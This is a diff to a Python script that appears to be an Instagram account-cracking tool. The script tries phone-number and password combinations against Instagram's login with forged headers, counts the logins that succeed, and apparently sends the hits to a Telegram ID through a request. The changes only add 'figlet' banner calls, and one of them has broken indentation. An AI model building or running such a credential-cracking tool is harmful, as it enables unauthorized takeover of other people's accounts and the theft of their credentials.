@@ -39,6 +39,7 @@ headers={
     'x-instagram-ajax': '05b80a16b1ac',
     'x-requested-with': 'XMLHttpRequest',
 }
+os.system('figlet fara')
 banek='''\x1b[1;97m
  [\033[32m1\x1b[1;97m] - Crack RAQAM+PASS
  [\033[32m2\x1b[1;97m] - Crack RAQAM+RAQAM
@@ -165,7 +166,7 @@ def crack():
 		if ('"authenticated":true') in reba:
 			r1+=1
 			os.system('clear')
-			
+			os.system('figlet fara')
 			print(logo)
 			print(logo2)
 			print('\033[32m OK : '+str(r1))
@@ -179,7 +180,7 @@ def crack():
 			responsek = requests.get(send_my)
 			r2+=1
 			os.system('clear')
-			
+			os.system('figlet fara')
 			print(logo)
 			print(logo2)
 			print('\033[32m OK : '+str(r1))
@@ -190,7 +191,7 @@ def crack():
 		
 			r4+=1
 			os.system('clear')
-		
+		    os.system('figlet fara')
 			print(logo)
 			print(logo2)
 			print('\033[32m OK : '+str(r1))
@@ -205,7 +206,7 @@ def crack():
 		else:
 			r3+=1
 			os.system('clear')
-			
+			os.system('figlet fara')
 			print(logo)
 			print(logo2)
 			print('\033[32m OK : '+str(r1))
@@ -217,6 +218,7 @@ def crack():
 
 
 os.system('clear')
+os.system('figlet fara')
 print(logo)
 print(logo2)
 id_tg =input(' ID Telegram: ')
